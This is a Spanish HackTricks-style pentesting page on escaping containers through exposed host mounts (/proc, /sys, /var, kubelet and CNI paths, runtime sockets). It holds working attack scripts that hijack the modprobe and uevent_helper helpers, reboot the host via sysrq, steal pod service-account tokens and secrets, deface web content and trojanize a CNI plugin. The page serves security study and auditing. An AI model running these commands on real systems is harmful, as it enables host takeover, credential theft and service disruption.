# Montajes sensibles del host

{{#include ../../../banners/hacktricks-training.md}}

## Descripción general

Los montajes del host son una de las superficies prácticas más importantes para el container-escape porque a menudo colapsan una vista de procesos cuidadosamente aislada y la convierten de nuevo en visibilidad directa de los recursos del host. Los casos peligrosos no se limitan a `/`. Los bind mounts de `/proc`, `/sys`, `/var`, los runtime sockets, el estado gestionado por kubelet o las rutas relacionadas con dispositivos pueden exponer controles del kernel, credenciales, filesystems de contenedores vecinos e interfaces de gestión del runtime.

Esta página existe por separado de las páginas de protección individuales porque el modelo de abuso es transversal. Un montaje del host con permisos de escritura es peligroso en parte por los mount namespaces, en parte por los user namespaces, en parte por la cobertura de AppArmor o SELinux y en parte por la ruta exacta del host que se expuso. Tratarlo como un tema propio facilita mucho el análisis de la attack surface.

## Exposición de `/proc`

procfs contiene tanto información ordinaria de procesos como interfaces de control del kernel de alto impacto. Por tanto, un bind mount como `-v /proc:/host/proc` o una vista del contenedor que exponga entradas de proc inesperadamente modificables puede provocar divulgación de información, denegación de servicio o ejecución directa de código en el host.

Las rutas de procfs de alto valor incluyen:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuso

Empieza comprobando qué entradas de procfs de alto valor son visibles o modificables:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Estas rutas son interesantes por diferentes motivos. `core_pattern`, `modprobe` y `binfmt_misc` pueden convertirse en rutas de code-execution en el host cuando son escribibles. `kallsyms`, `kmsg`, `kcore` y `config.gz` son potentes fuentes de reconnaissance para la explotación del kernel. `sched_debug` y `mountinfo` revelan el contexto de procesos, cgroups y sistemas de archivos, lo que puede ayudar a reconstruir el layout del host desde dentro del container.

El valor práctico de cada ruta es diferente, y tratarlas como si todas tuvieran el mismo impacto dificulta el triage:

- `/proc/sys/kernel/core_pattern`
Si es escribible, esta es una de las rutas procfs de mayor impacto, porque el kernel ejecutará un pipe handler después de un crash. Un container que pueda apuntar `core_pattern` a un payload almacenado en su overlay o en una ruta del host montada a menudo puede obtener code-execution en el host. Consulta también [read-only-paths.md](protections/read-only-paths.md) para ver un ejemplo específico.
- `/proc/sys/kernel/modprobe`
Esta ruta controla el userspace helper utilizado por el kernel cuando necesita invocar la lógica de carga de módulos. Si es escribible desde el container y se interpreta en el contexto del host, puede convertirse en otra primitive de code-execution en el host. Es especialmente interesante cuando se combina con una forma de activar la ruta del helper.
- `/proc/sys/vm/panic_on_oom`
Normalmente no es una primitive de escape limpia, pero puede convertir la presión de memoria en una denial of service a nivel del host al transformar las condiciones OOM en un comportamiento de kernel panic.
- `/proc/sys/fs/binfmt_misc`
Si la interfaz de registro es escribible, el atacante puede registrar un handler para un valor magic elegido y obtener ejecución en el contexto del host cuando se ejecute un archivo coincidente.
- `/proc/config.gz`
Útil para el triage de exploits del kernel. Ayuda a determinar qué subsistemas, mitigations y features opcionales del kernel están habilitados sin necesitar los metadatos de paquetes del host.
- `/proc/sysrq-trigger`
Principalmente una ruta de denial of service, pero muy grave. Puede reiniciar, provocar un panic o interrumpir de cualquier otra forma el host inmediatamente.
- `/proc/kmsg`
Revela los mensajes del ring buffer del kernel. Es útil para fingerprinting del host, análisis de crashes y, en algunos entornos, para filtrar información útil para la explotación del kernel.
- `/proc/kallsyms`
Es valioso cuando es legible porque expone información sobre los símbolos exportados del kernel y puede ayudar a eludir las suposiciones de address randomization durante el desarrollo de exploits del kernel.
- `/proc/[pid]/mem`
Esta es una interfaz directa a la memoria de procesos. Si se puede alcanzar el proceso objetivo con las condiciones necesarias similares a ptrace, puede permitir leer o modificar la memoria de otro proceso. El impacto real depende en gran medida de las credentials, `hidepid`, Yama y las restricciones de ptrace, por lo que es una ruta potente pero condicional.
- `/proc/kcore`
Expone una vista de la memoria del sistema similar a una core image. El archivo es enorme y difícil de utilizar, pero si es legiblemente accesible indica una superficie de memoria del host gravemente expuesta.
- `/proc/kmem` y `/proc/mem`
Interfaces de memoria raw históricamente de gran impacto. En muchos sistemas modernos están deshabilitadas o muy restringidas, pero si están presentes y pueden utilizarse deben tratarse como hallazgos críticos.
- `/proc/sched_debug`
Filtra información de scheduling y tareas que puede exponer las identidades de procesos del host incluso cuando otras vistas de procesos parecen más limpias de lo esperado.
- `/proc/[pid]/mountinfo`
Es extremadamente útil para reconstruir dónde vive realmente el container en el host, qué rutas están respaldadas por overlay y si un mount escribible corresponde a contenido del host o únicamente a la capa del container.

Si `/proc/[pid]/mountinfo` o los detalles del overlay son legibles, utilízalos para recuperar la ruta del host correspondiente al filesystem del container:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Estos comandos son útiles porque varios trucos de ejecución en el host requieren convertir una ruta dentro del contenedor en la ruta correspondiente desde el punto de vista del host.

### Ejemplo completo: abuso de la ruta del helper de `modprobe`

Si `/proc/sys/kernel/modprobe` se puede escribir desde el contenedor y la ruta del helper se interpreta en el contexto del host, puede redirigirse a un payload controlado por el atacante:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
El activador exacto depende del objetivo y del comportamiento del kernel, pero el punto importante es que una ruta auxiliar con permisos de escritura puede redirigir una futura invocación de un helper del kernel hacia contenido de la ruta del host controlado por el atacante.

### Ejemplo completo: Recon del kernel con `kallsyms`, `kmsg` y `config.gz`

Si el objetivo es evaluar la explotabilidad en lugar de realizar un escape inmediato:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Estos comandos ayudan a determinar si hay información útil de símbolos visible, si los mensajes recientes del kernel revelan un estado interesante y qué funciones o mitigaciones del kernel están compiladas. El impacto normalmente no consiste en un escape directo, pero puede reducir considerablemente el tiempo de triage de vulnerabilidades del kernel.

### Ejemplo completo: reinicio del host mediante SysRq

Si `/proc/sysrq-trigger` tiene permisos de escritura y alcanza la vista del host:
```bash
echo b > /proc/sysrq-trigger
```
El efecto es un reinicio inmediato del host. No es un ejemplo sutil, pero demuestra claramente que la exposición de procfs puede ser mucho más grave que una simple divulgación de información.

## Exposición de `/sys`

sysfs expone grandes cantidades de información sobre el estado del kernel y de los dispositivos. Algunas rutas de sysfs son principalmente útiles para fingerprinting, mientras que otras pueden afectar a la ejecución de helpers, al comportamiento de los dispositivos, a la configuración de los security modules o al estado del firmware.

Entre las rutas de sysfs de alto valor se incluyen:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Estas rutas son importantes por distintos motivos. `/sys/class/thermal` puede influir en el comportamiento de la gestión térmica y, por tanto, en la estabilidad del host en entornos con una exposición deficiente. `/sys/kernel/vmcoreinfo` puede filtrar información de los crash dumps y de la distribución de memoria del kernel, lo que ayuda al fingerprinting del host a bajo nivel. `/sys/kernel/security` es la interfaz `securityfs` utilizada por los Linux Security Modules, por lo que un acceso inesperado puede exponer o modificar el estado relacionado con MAC. Las rutas de variables EFI pueden afectar a la configuración de arranque respaldada por el firmware, lo que las hace mucho más graves que los archivos de configuración ordinarios. `debugfs`, ubicado en `/sys/kernel/debug`, es especialmente peligroso porque es intencionadamente una interfaz orientada a desarrolladores, con muchas menos expectativas de seguridad que las APIs del kernel destinadas a entornos de producción.

Los comandos de revisión útiles para estas rutas son:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Qué hace interesantes esos comandos:

- `/sys/kernel/security` puede revelar si AppArmor, SELinux u otra superficie LSM es visible de una forma que debería haber permanecido únicamente en el host.
- `/sys/kernel/debug` suele ser el hallazgo más alarmante de este grupo. Si `debugfs` está montado y permite lectura o escritura, cabe esperar una amplia superficie orientada al kernel cuyo riesgo exacto depende de los nodos de depuración habilitados.
- La exposición de variables EFI es menos común, pero tiene un alto impacto si está presente, porque afecta a configuraciones respaldadas por el firmware en lugar de a archivos normales del entorno de ejecución.
- `/sys/class/thermal` es principalmente relevante para la estabilidad del host y la interacción con el hardware, no para un escape limpio al estilo de un shell.
- `/sys/kernel/vmcoreinfo` es principalmente una fuente de fingerprinting del host y de análisis de fallos, útil para comprender el estado del kernel a bajo nivel.

### Ejemplo completo: `uevent_helper`

Si `/sys/kernel/uevent_helper` permite escritura, el kernel puede ejecutar un helper controlado por el atacante cuando se activa un `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
La razón por la que esto funciona es que la ruta del helper se interpreta desde el punto de vista del host. Una vez activado, el helper se ejecuta en el contexto del host en lugar de hacerlo dentro del contenedor actual.

## Exposición de `/var`

Montar el `/var` del host en un contenedor suele subestimarse porque no parece tan dramático como montar `/`. En la práctica, puede ser suficiente para acceder a sockets de runtime, directorios de snapshots de contenedores, volúmenes de pods gestionados por kubelet, tokens de service-account proyectados y sistemas de archivos de aplicaciones vecinas. En los nodos modernos, `/var` suele ser donde realmente reside el estado de contenedores más interesante desde el punto de vista operativo.

### Ejemplo de Kubernetes

Un pod con `hostPath: /var` a menudo puede leer los tokens proyectados de otros pods y el contenido de los snapshots de overlay:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Estos comandos son útiles porque indican si el montaje solo expone datos de aplicación sin importancia o credenciales del clúster de alto impacto. Un token de cuenta de servicio legible puede convertir inmediatamente la ejecución de código local en acceso a la API de Kubernetes.

Si el token está presente, valida a qué recursos puede acceder en lugar de detenerte al descubrir el token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
El impacto aquí puede ser mucho mayor que el acceso al nodo local. Un token con un RBAC amplio puede convertir un `/var` montado en un compromiso de todo el cluster.

### Ejemplo de Docker y containerd

En los hosts de Docker, los datos relevantes suelen estar en `/var/lib/docker`, mientras que en los nodos de Kubernetes respaldados por containerd pueden estar en `/var/lib/containerd` o en rutas específicas del snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Si el `/var` montado expone contenido de snapshot con permisos de escritura de otra carga de trabajo, el atacante podría modificar archivos de la aplicación, colocar contenido web o cambiar scripts de inicio sin tocar la configuración del contenedor actual.

Ideas concretas de abuso una vez encontrado contenido de snapshot con permisos de escritura:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Estos comandos son útiles porque muestran las tres principales familias de impacto de un `/var` montado: manipulación de aplicaciones, recuperación de secretos y movimiento lateral hacia workloads vecinos.

## Estado de Kubelet, plugins y rutas de CNI

Un montaje de `/var/lib/kubelet`, `/opt/cni/bin` o `/etc/cni/net.d` suele estar expuesto a través de DaemonSets privilegiados, agentes de CNI, plugins de nodo CSI, operadores de GPU y herramientas auxiliares de almacenamiento. Es fácil considerar estos montajes como "infraestructura del nodo", pero se encuentran directamente en la ruta de ejecución de los nuevos pods y a menudo contienen credenciales de kubelet, secretos proyectados, sockets de registro y binarios ejecutables de plugins del host.

Los objetivos de alto valor incluyen:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Los comandos de revisión útiles son:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Por qué importan estas rutas:

- `/var/lib/kubelet/pki` puede exponer certificados de cliente de kubelet y otras credenciales locales del nodo que, en ocasiones, pueden reutilizarse contra el API server o los endpoints TLS orientados a kubelet, según el diseño del clúster.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` suele contener tokens de service-account proyectados y Secrets montados para otros pods del mismo nodo.
- `/var/lib/kubelet/pod-resources/kubelet.sock` es principalmente una superficie de reconnaissance, pero muy útil: revela qué pods y contenedores poseen actualmente GPUs, hugepages, dispositivos SR-IOV y otros recursos locales del nodo que son escasos.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` y `/var/lib/kubelet/plugins_registry` revelan qué plugins de CSI, DRA y dispositivos están instalados y con qué sockets se espera que se comunique kubelet. Si esos directorios son escribibles en lugar de ser únicamente legibles, el hallazgo se vuelve mucho más grave.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` y `/etc/cni/net.d` se encuentran directamente en la ruta de configuración de la red de los pods. El acceso de escritura allí suele ser una primitiva de ejecución diferida en el host, más que una simple exposición de configuración.<sup>[[2]](#references)</sup>

### Ejemplo completo: `/opt/cni/bin` escribible

Si el directorio de binarios CNI del host está montado con permisos de lectura y escritura, reemplazar un plugin puede bastar para obtener ejecución en el host la próxima vez que kubelet cree un sandbox de pod en ese nodo:<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Esto no es tan inmediato como un `docker.sock` montado, pero suele ser más realista en pods de infraestructura de Kubernetes comprometidos. El punto importante es que el binario modificado se ejecuta posteriormente mediante el flujo de configuración de red del host, no mediante el contenedor actual.

## Runtime Sockets

Los montajes sensibles del host suelen incluir sockets de runtime en lugar de directorios completos. Son tan importantes que merecen repetirse explícitamente aquí:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Consulta [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) para conocer los flujos de explotación completos una vez montado uno de estos sockets.

Como patrón de primera interacción rápida:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Si uno de estos tiene éxito, la ruta desde un "mounted socket" hasta "start a more privileged sibling container" suele ser mucho más corta que cualquier ruta de escape del kernel.

## Writable Host Path Task Hijack

Un montaje de host con permisos de escritura no necesita exponer `/` para ser peligroso. Si la ruta montada contiene scripts, archivos de configuración, hooks, plugins o archivos que posteriormente consume una tarea programada o un servicio del host, el contenedor podría cambiar lo que ejecuta el host.

Flujo de revisión genérico:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Si un archivo modificable es consumido por un proceso del host, mantén el payload simple y observable durante las pruebas:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
La parte interesante es el límite de confianza: la escritura se realiza desde dentro del contenedor, pero la ejecución ocurre posteriormente en el contexto del servicio del host. Esto convierte un `hostPath` o bind mount limitado en una primitiva de ejecución de código en el host diferida.

## CVE relacionadas con montajes

Los montajes del host también se relacionan con vulnerabilidades del runtime. Entre los ejemplos recientes importantes se incluyen:

- `CVE-2024-21626` en `runc`, donde un descriptor de archivo de directorio filtrado podía ubicar el directorio de trabajo en el sistema de archivos del host.
- `CVE-2024-23651`, `CVE-2024-23652` y `CVE-2024-23653` en BuildKit, donde Dockerfiles, frontends y flujos `RUN --mount` maliciosos podían reintroducir el acceso a archivos del host, su eliminación o privilegios elevados durante las builds.
- `CVE-2024-1753` en los flujos de build de Buildah y Podman, donde bind mounts manipulados durante la build podían exponer `/` con permisos de lectura y escritura.
- `CVE-2025-47290` en `containerd` 2.1.0, donde una condición TOCTOU durante la extracción de una imagen podía permitir que una imagen especialmente manipulada modificara el sistema de archivos del host durante el pull.

Estas CVE son importantes aquí porque muestran que la gestión de montajes no depende únicamente de la configuración del operador. El runtime también puede introducir condiciones de escape impulsadas por montajes.

## Comprobaciones

Usa estos comandos para localizar rápidamente las exposiciones de montajes de mayor valor:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Qué es interesante aquí:

- La raíz del host, `/proc`, `/sys`, `/var` y los sockets de runtime son hallazgos de alta prioridad.
- Las entradas de proc/sys con permisos de escritura suelen indicar que el mount expone controles del kernel globales del host, en lugar de una vista segura del container.
- Las rutas `/var` montadas requieren revisar las credenciales y las cargas de trabajo vecinas, no solo el filesystem.
- Los directorios de estado de Kubelet y las rutas de CNI/plugin merecen la misma prioridad que los sockets de runtime, porque a menudo se encuentran directamente en la ruta de creación de pods y distribución de credenciales del nodo.

## Referencias

- [1] [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)

{{#include ../../../banners/hacktricks-training.md}}
